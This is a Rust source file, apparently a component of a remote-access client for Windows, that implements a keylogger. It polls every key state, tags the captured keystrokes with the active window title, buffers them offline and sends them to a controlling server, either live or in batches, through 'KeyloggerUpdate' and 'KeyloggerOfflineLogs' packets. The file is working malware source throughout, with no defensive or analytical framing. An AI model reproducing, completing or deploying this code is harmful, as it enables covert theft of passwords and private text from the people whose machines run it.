use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::thread;
use std::time::Duration;

use winapi::um::winuser::*;
use common::packets::{KeyloggerUpdate, ServerboundPacket};
use crate::handler::send_packet;
use once_cell::sync::Lazy;

static KEYLOGGER_RUNNING: AtomicBool = AtomicBool::new(false);
static REALTIME_MODE: AtomicBool = AtomicBool::new(false);
static OFFLINE_BUFFER: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));

pub fn start_keylogger(realtime: bool) {
    if KEYLOGGER_RUNNING.load(Ordering::SeqCst) {
        REALTIME_MODE.store(realtime, Ordering::SeqCst);
        return;
    }

    KEYLOGGER_RUNNING.store(true, Ordering::SeqCst);
    REALTIME_MODE.store(realtime, Ordering::SeqCst);

    thread::spawn(move || {
        let mut last_window = String::new();
        let mut key_buffer = String::new();

        while KEYLOGGER_RUNNING.load(Ordering::SeqCst) {
            let active_window = get_active_window_title();
            
            if active_window != last_window && !key_buffer.is_empty() {
                flush_keys(&last_window, &key_buffer);
                key_buffer.clear();
                last_window = active_window.clone();
            }

            for key in 8..255 {
                // Check if key is pressed
                if unsafe { GetAsyncKeyState(key as i32) } as u16 & 0x8000 != 0 {
                    let key_str = translate_key(key as u32);
                    if !key_str.is_empty() {
                        key_buffer.push_str(&key_str);
                        
                        if REALTIME_MODE.load(Ordering::SeqCst) {
                            let update = KeyloggerUpdate {
                                window_title: active_window.clone(),
                                key_data: key_str.clone(),
                            };
                            tokio::spawn(async move {
                                let _ = send_packet(ServerboundPacket::KeyloggerUpdate(update)).await;
                            });
                        }
                    }
                }
            }

            thread::sleep(Duration::from_millis(10));
        }
        
        if !key_buffer.is_empty() {
            flush_keys(&last_window, &key_buffer);
        }
    });
}

pub fn stop_keylogger() {
    KEYLOGGER_RUNNING.store(false, Ordering::SeqCst);
}

pub async fn send_offline_logs() {
    let logs = {
        let mut buffer = OFFLINE_BUFFER.lock().unwrap();
        let logs = buffer.clone();
        buffer.clear();
        logs
    };

    if !logs.is_empty() {
        let _ = send_packet(ServerboundPacket::KeyloggerOfflineLogs(logs)).await;
    }
}

pub fn clear_offline_logs() {
    OFFLINE_BUFFER.lock().unwrap().clear();
}

fn flush_keys(window: &str, keys: &str) {
    let log_entry = format!("[{}] {}", window, keys);
    OFFLINE_BUFFER.lock().unwrap().push(log_entry);
}

fn get_active_window_title() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return "Unknown".to_string();
        }

        let mut buffer = [0u16; 512];
        let len = GetWindowTextW(hwnd, buffer.as_mut_ptr(), 512);
        if len > 0 {
            String::from_utf16_lossy(&buffer[..len as usize])
        } else {
            "Unknown".to_string()
        }
    }
}

fn translate_key(key: u32) -> String {
    match key {
        _ => {
            if key == VK_SPACE as u32 { " ".to_string() }
            else if key == VK_RETURN as u32 { "[ENTER]\n".to_string() }
            else if key == VK_BACK as u32 { "[BACKSPACE]".to_string() }
            else if key == VK_TAB as u32 { "[TAB]".to_string() }
            else if key == VK_SHIFT as u32 || key == VK_LSHIFT as u32 || key == VK_RSHIFT as u32 { "".to_string() }
            else if key == VK_CONTROL as u32 || key == VK_LCONTROL as u32 || key == VK_RCONTROL as u32 { "".to_string() }
            else if key == VK_MENU as u32 || key == VK_LMENU as u32 || key == VK_RMENU as u32 { "".to_string() }
            else if key == VK_CAPITAL as u32 { "[CAPSLOCK]".to_string() }
            else if key == VK_ESCAPE as u32 { "[ESC]".to_string() }
            else if key == VK_LEFT as u32 { "[LEFT]".to_string() }
            else if key == VK_RIGHT as u32 { "[RIGHT]".to_string() }
            else if key == VK_UP as u32 { "[UP]".to_string() }
            else if key == VK_DOWN as u32 { "[DOWN]".to_string() }
            else if key == VK_DELETE as u32 { "[DEL]".to_string() }
            else if key == VK_INSERT as u32 { "[INS]".to_string() }
            else if key == VK_HOME as u32 { "[HOME]".to_string() }
            else if key == VK_END as u32 { "[END]".to_string() }
            else if key == VK_PRIOR as u32 { "[PGUP]".to_string() }
            else if key == VK_NEXT as u32 { "[PGDN]".to_string() }
            else if key == VK_LWIN as u32 || key == VK_RWIN as u32 { "[WIN]".to_string() }
            else {
                let mut state = [0u8; 256];
                unsafe {
                    if GetKeyboardState(state.as_mut_ptr()) != 0 {
                        let mut buffer = [0u16; 5];
                        let len = ToUnicode(key, 0, state.as_ptr(), buffer.as_mut_ptr(), 5, 0);
                        if len > 0 {
                            String::from_utf16_lossy(&buffer[..len as usize])
                        } else {
                            "".to_string()
                        }
                    } else {
                        "".to_string()
                    }
                }
            }
        }
    }
}
